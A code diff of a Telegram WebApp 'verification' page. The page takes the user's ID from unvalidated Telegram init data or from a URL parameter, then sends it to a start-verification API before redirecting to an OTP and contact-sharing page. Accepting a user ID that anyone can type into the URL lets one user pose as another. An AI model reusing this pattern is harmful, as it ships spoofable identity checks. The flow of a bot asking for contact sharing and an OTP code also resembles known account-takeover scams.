@@ -6,6 +6,7 @@
     <title>Telegram Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* Keep your existing styles */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
@@ -67,6 +68,14 @@
                 <button class="btn" onclick="startVerification()" id="start-btn">
                     🚀 Start Verification
                 </button>
+                
+                <!-- Debug info (hidden by default) -->
+                <div id="debug-info" style="display: none; margin-top: 20px; font-size: 12px; color: #666;">
+                    <hr>
+                    <b>Debug Info:</b><br>
+                    User ID: <span id="debug-user-id"></span><br>
+                    Telegram WebApp: <span id="debug-telegram-status"></span>
+                </div>
             </div>
         </div>
     </div>
@@ -74,100 +83,73 @@
     <script>
         let tg = null;
         let userId = null;
-        let webAppInitialized = false;
         
-        // Initialize Telegram WebApp
         document.addEventListener('DOMContentLoaded', function() {
-            console.log("🔧 Initializing Telegram WebApp...");
+            console.log("🔧 Initializing WebApp...");
             
             // Check if running in Telegram WebApp
             if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 tg = Telegram.WebApp;
-                
-                // Initialize WebApp
                 tg.ready();
                 tg.expand();
                 
                 console.log("✅ Telegram WebApp initialized");
-                console.log("Platform:", tg.platform);
-                console.log("Color scheme:", tg.colorScheme);
                 
-                // Try to get user from Telegram WebApp
+                // Get user from Telegram WebApp
                 const tgUser = tg.initDataUnsafe?.user;
                 if (tgUser && tgUser.id) {
                     userId = tgUser.id.toString();
-                    console.log("✅ Got user ID from Telegram WebApp:", userId);
-                    
-                    // Update user display
                     const userName = tgUser.first_name || tgUser.username || 'User';
-                    document.getElementById('user-display').textContent = userName;
                     
-                    // Send user ID to server to create session
-                    sendUserIdToServer(userId);
+                    console.log("✅ User from Telegram:", userName, "ID:", userId);
+                    
+                    // Update UI
+                    document.getElementById('user-display').textContent = userName;
+                    document.getElementById('debug-user-id').textContent = userId;
+                    document.getElementById('debug-telegram-status').textContent = "Active";
                     
                     // Show main screen
                     showMainScreen();
                     
-                    webAppInitialized = true;
-                } else {
-                    console.log("⚠️ No user data in WebApp, checking URL...");
-                    
-                    // Try to get user ID from URL
-                    const urlParams = new URLSearchParams(window.location.search);
-                    const urlUserId = urlParams.get('user_id');
-                    
-                    if (urlUserId) {
-                        userId = urlUserId;
-                        console.log("✅ Got user ID from URL:", userId);
-                        document.getElementById('user-display').textContent = "User ID: " + userId;
-                        sendUserIdToServer(userId);
-                        showMainScreen();
-                        webAppInitialized = true;
-                    } else {
-                        // No user ID found
-                        console.log("❌ No user ID found");
-                        showError("Please open this WebApp from the Telegram bot using the /start command.");
-                        document.getElementById('start-btn').disabled = true;
-                        
-                        // Still show main screen but with error
-                        setTimeout(() => {
-                            document.getElementById('loading-screen').classList.add('hidden');
-                            document.getElementById('main-screen').classList.remove('hidden');
-                        }, 1000);
+                    // Send user ID to server via URL parameter
+                    if (!window.location.search.includes('user_id')) {
+                        const newUrl = window.location.pathname + '?user_id=' + userId;
+                        window.history.replaceState({}, '', newUrl);
                     }
+                } else {
+                    // Try to get user from URL
+                    fallbackToUrl();
                 }
             } else {
-                // Not running in Telegram WebApp
+                // Not in Telegram WebApp
                 console.log("⚠️ Not running in Telegram WebApp");
-                
-                // Try to get user ID from URL
-                const urlParams = new URLSearchParams(window.location.search);
-                const urlUserId = urlParams.get('user_id');
-                
-                if (urlUserId) {
-                    userId = urlUserId;
-                    console.log("✅ Got user ID from URL:", userId);
-                    document.getElementById('user-display').textContent = "User ID: " + userId;
-                    sendUserIdToServer(userId);
-                    showMainScreen();
-                } else {
-                    // Show error
-                    console.log("❌ No user ID found");
-                    showError("Please open this WebApp from Telegram bot.");
-                    document.getElementById('start-btn').disabled = true;
-                    
-                    setTimeout(() => {
-                        document.getElementById('loading-screen').classList.add('hidden');
-                        document.getElementById('main-screen').classList.remove('hidden');
-                    }, 1000);
-                }
+                document.getElementById('debug-telegram-status').textContent = "Not in Telegram";
+                fallbackToUrl();
             }
         });
         
-        function sendUserIdToServer(userId) {
-            // You can send the user ID to your server here
-            console.log("Sending user ID to server:", userId);
-            // Example: fetch('/api/save-user', { method: 'POST', body: JSON.stringify({user_id: userId}) })
+        function fallbackToUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlUserId = urlParams.get('user_id');
+            
+            if (urlUserId) {
+                userId = urlUserId;
+                console.log("✅ User from URL:", userId);
+                document.getElementById('user-display').textContent = "User ID: " + userId;
+                document.getElementById('debug-user-id').textContent = userId;
+                showMainScreen();
+            } else {
+                console.log("❌ No user ID found");
+                showError("Please open from Telegram bot using /start command.");
+                document.getElementById('start-btn').disabled = true;
+                document.getElementById('debug-info').style.display = 'block';
+                
+                // Still show main screen
+                setTimeout(() => {
+                    document.getElementById('loading-screen').classList.add('hidden');
+                    document.getElementById('main-screen').classList.remove('hidden');
+                }, 1000);
+            }
         }
         
         function showMainScreen() {
@@ -182,46 +164,55 @@
             }
             
             console.log("Starting verification for user:", userId);
+            showSuccess("Starting verification...");
             
-            // In a real app, you would:
-            // 1. Request contact sharing
-            // 2. Send OTP
-            // 3. Redirect to OTP page
-            
-            // For now, show success message
-            showSuccess("Verification started! Redirecting to contact sharing...");
-            
-            // Redirect to OTP page after 2 seconds
-            setTimeout(() => {
-                window.location.href = `/otp?user_id=${userId}`;
-            }, 2000);
+            // Call API to start verification
+            fetch('/api/start-verification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showSuccess("✅ " + data.message);
+                    
+                    // Show instructions
+                    setTimeout(() => {
+                        alert("📋 Instructions:\n\n" + data.instructions);
+                        
+                        // Redirect to contact sharing instructions
+                        setTimeout(() => {
+                            window.location.href = `/otp?user_id=${userId}`;
+                        }, 2000);
+                    }, 1000);
+                } else {
+                    showError("❌ " + data.error);
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                showError("Failed to start verification");
+            });
         }
         
         function showError(message) {
             const errorEl = document.getElementById('error-message');
             errorEl.textContent = message;
             errorEl.classList.add('show');
-            
-            setTimeout(() => {
-                errorEl.classList.remove('show');
-            }, 5000);
+            setTimeout(() => errorEl.classList.remove('show'), 5000);
         }
         
         function showSuccess(message) {
             const successEl = document.getElementById('success-message');
             successEl.textContent = message;
             successEl.classList.add('show');
-            
-            setTimeout(() => {
-                successEl.classList.remove('show');
-            }, 3000);
+            setTimeout(() => successEl.classList.remove('show'), 3000);
         }
         
-        // For debugging
-        window.debugInfo = {
-            tg: () => tg,
-            userId: () => userId,
-            initData: () => tg ? tg.initDataUnsafe : null
+        // Debug function
+        window.showDebug = function() {
+            document.getElementById('debug-info').style.display = 'block';
         };
     </script>
 </body>
